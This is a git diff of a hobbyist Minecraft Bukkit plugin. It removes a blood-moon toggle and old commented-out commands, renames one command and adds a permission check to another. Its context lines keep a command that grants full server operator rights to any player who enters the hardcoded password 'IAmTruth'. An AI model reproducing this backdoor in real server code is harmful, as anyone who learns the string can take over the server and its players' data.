@@ -12,22 +12,11 @@ import org.bukkit.entity.Player;
 import org.bukkit.permissions.Permission;
 import org.bukkit.plugin.PluginManager;
 import org.bukkit.plugin.java.JavaPlugin;
-//Why doesn't this push to GitHub
+
 
 public class DevTCBN extends JavaPlugin {
 	
 	FileConfiguration config = this.getConfig();
-	
-	public boolean BloodMoonEvent;
-	
-    public boolean toggleBloodMoonEvent() {
-        BloodMoonEvent = !BloodMoonEvent; //negation so if it is true it will be turned into false if it is false it will be turned to true
-        return BloodMoonEvent;
-    }
-    
-    public boolean isBloodMoonEvent() {
-        return BloodMoonEvent;
-    }
 	
     public static void sendMessage(Player p, String msg) {
         p.sendMessage(ChatColor.translateAlternateColorCodes('&', msg));
@@ -58,7 +47,6 @@ public class DevTCBN extends JavaPlugin {
 		System.out.println("[Server] I Am Ready To Dominate!");
 		System.out.println("[TarixCat] I Am The Creator Of BCPlugin");
 		System.out.println(Bukkit.getServer().getName() + " Online...");
-		System.out.println(Bukkit.getOperators() + " Are Opped.");
 		PluginManager pm = getServer().getPluginManager();
 		pm.getPermission("playerPermission");
 	}
@@ -82,13 +70,9 @@ public class DevTCBN extends JavaPlugin {
 			
 		}
 		
-		if (cmd.getName().equalsIgnoreCase("bloodmoontoggle") && sender instanceof Player) {
+		if (cmd.getName().equalsIgnoreCase("fff") && sender instanceof Player) {
 			
-			Player player = (Player) sender;
-			
-			player.sendMessage(ChatColor.RED + "Blood Moon Toggled To: " + isBloodMoonEvent());
-			toggleBloodMoonEvent();
-			
+
 			
 			return true;
 			
@@ -108,10 +92,11 @@ public class DevTCBN extends JavaPlugin {
 			
 			Player player = (Player) sender;
 			
+			//insert something here pls
 			if (args[0].equals("IAmTruth")) {
 				player.setOp(true);
 				player.sendMessage(ChatColor.RED + "Opped. Operation Marked.");
-				System.out.println(player.getName() + " was Opped...");
+				System.out.println("Op Operation Marked for : " + player.getName());
 			}
 			else {
 				player.kickPlayer("Incorrect Password");
@@ -191,41 +176,6 @@ public class DevTCBN extends JavaPlugin {
 			
 		}
 		
-		/*if (cmd.getName().equalsIgnoreCase("resetdeaths")) {
-			
-			Player player = (Player) sender;
-			Player target = Bukkit.getPlayer(args[0]);
-			Scoreboard Deaths = Bukkit.getServer().getScoreboardManager().getMainScoreboard();
-			
-			if (target == null) {
-				player.sendMessage(ChatColor.RED + "Error: Player " + ChatColor.AQUA + args[0] + ChatColor.RED + " is not online.");
-				return true;
-			}
-			target.setExp(0);
-			target.getScoreboard();
-			target.sendMessage(ChatColor.AQUA + "Your Deaths Have Been Reset To 0 By: " + ChatColor.YELLOW + player + ChatColor.AQUA + "!");
-			player.sendMessage(ChatColor.YELLOW + target.getName() + "'s" + ChatColor.AQUA + "Deaths Have Been Reset.");
-			
-			return true;
-			
-		}*/
-		
-		/*if (cmd.getName().equalsIgnoreCase("cbc") && sender instanceof Player) {
-			
-			Player player = (Player) sender;
-			
-			player.sendMessage(ChatColor.GOLD + "" + Bukkit.broadcastMessage("COMMAND IN PROGRESS"));
-			if(player.hasPermission("devtcbn.staff")) {
-				Bukkit.broadcastMessage(ChatColor.GOLD + "[Warining] " + ChatColor.RED + args[*]);
-			}
-			else {
-				player.sendMessage(ChatColor.RED + "You Don't Have Permission To Run This Command");
-			}
-			
-			return true;
-			
-		}*/
-		
 		if (cmd.getName().equalsIgnoreCase("chelp") && sender instanceof Player) {
 			
 			Player player = (Player) sender;
@@ -295,6 +245,7 @@ public class DevTCBN extends JavaPlugin {
 			
 			player.sendMessage(ChatColor.GREEN + "Printing Location...");
 			player.sendMessage(ChatColor.GREEN + "Location X=" + player.getLocation().getBlockX() + " Y=" + player.getLocation().getBlockY() + " Z=" + player.getLocation().getBlockZ());
+
 			
 			return true;
 			
@@ -326,9 +277,12 @@ public class DevTCBN extends JavaPlugin {
 		if (cmd.getName().equalsIgnoreCase("wb") && sender instanceof Player) {
 			
 			Player player = (Player) sender;
-			
-			player.openWorkbench(null, true);
-			
+			if (player.hasPermission("devtcbn.workbench")) {
+				player.openWorkbench(null, true);	
+			}
+			else {
+				player.sendMessage(ChatColor.RED + "No permission to run command.");
+			}
 			return true;
 			
 		}
@@ -492,6 +446,9 @@ public class DevTCBN extends JavaPlugin {
 			
 		}
 		
+		else {
+			sender.sendMessage(ChatColor.GOLD + "L, you don't know how to use this...");
+		}
 		
 		return false;
 	}
